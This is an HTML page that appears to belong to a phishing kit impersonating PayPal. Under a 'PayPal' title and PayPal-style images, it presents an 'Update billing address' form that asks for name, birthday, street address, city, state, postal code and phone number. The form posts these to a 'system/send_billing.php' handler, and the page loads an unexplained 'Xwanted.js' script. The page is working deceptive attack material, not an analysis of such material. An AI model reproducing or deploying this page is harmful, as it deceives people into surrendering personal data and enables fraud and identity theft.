<!DOCTYPE html>
<html>
<head>
	<title>PayPal</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="assets/bulma.min.css">
	<link rel="stylesheet" type="text/css" href="assets/style.css">
<link rel="shortcut icon" href="assets/pp_favicon_x.ico" />
</head>
<body style="font-family: 'PayPal-Sans', sans-serif!important;">
<form action="system/send_billing.php" method="post">
<nav id="nav_desktop">
	<div class="container_desktop">
	<img src="assets/navbar_left.png" alt="" class="navbar_left"><img src="assets/navbar_right.png" alt="" class="navbar_right">
	</div>
</nav>
<nav id="nav_mobile">
	<div class="container_mobile">
	<img src="assets/menu.png" alt="" class="navbar_mobile_left">
	<center><img src="assets/ppl.png" alt="" class="navbar_mobile_center"></center>
	<img src="assets/alert.png" alt="" class="navbar_mobile_right">
	</div>
</nav>
<br><br>
<div id="subnav">
	<div class="container_desktop">
	<img src="assets/hi.png" alt="" class="subnav_left"><img src="assets/payForGood.png" alt="" class="subnav_right">
	</div>
	<div class="hr_two"></div>
</div>
<br><br>

<div class="container_panel">
	<div class="panel">
		<h1 class="panel-title">Update billing address</h1>
		<div class="columns is-multiline is-mobile" id="col">
			<div class="column is-6">
				<input type="text" class="input_text" name="fn" id="fn" placeholder="First Name" minlength="3" required>
			</div>
			<div class="column is-6">
				<input type="text" class="input_text" name="ln" id="ln" placeholder="Last Name" minlength="3" required>
			</div>

			<div class="column is-12">
				<input type="text" class="input_text" name="bd" id="bd" placeholder="Birthday" maxlength="14" minlength="14" required>
			</div>
			<div class="column is-12">
				<input type="text" class="input_text" name="al" id="al" placeholder="Adress Line" minlength="10" required>
			</div>

			<div class="column is-6">
				<input type="text" class="input_text" name="city" id="city" placeholder="City" minlength="3" required>
			</div>
			<div class="column is-6">
				<input type="text" class="input_text" name="state" id="state" placeholder="State" minlength="3" required>
			</div>

			<div class="column is-12">
				<input type="text" class="input_text" name="zip" id="zip" placeholder="Postal Code" minlength="3" required>
			</div>
			<div class="column is-12">
				<input type="text" class="input_text" name="pn" id="pn" placeholder="Phone Number" minlength="8" required>
			</div>
			<div class="column is-12">
				<button name="btn" id="btn">CONTINUE</button>
			</div>
		</div>
	</div>
</div>

<div class="spinner loading" id="spinner" style="display: none;"></div>
<br><br><br><br><br><br><br>
<footer>
	<img src="assets/footer_left.png" alt="" class="footer_left"><br><br>
	<div class="hr"></div>
	<br><br><img src="assets/footer_right.png" alt="" class="footer_right"><img src="assets/footer_mobile.png" alt="" style="display: none;" class="footer_mobile">
</footer>
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script type="text/javascript" src="assets/Xwanted.js"></script>
<script type="text/javascript" src="assets/validator.js"></script>
</form>
</body>
</html>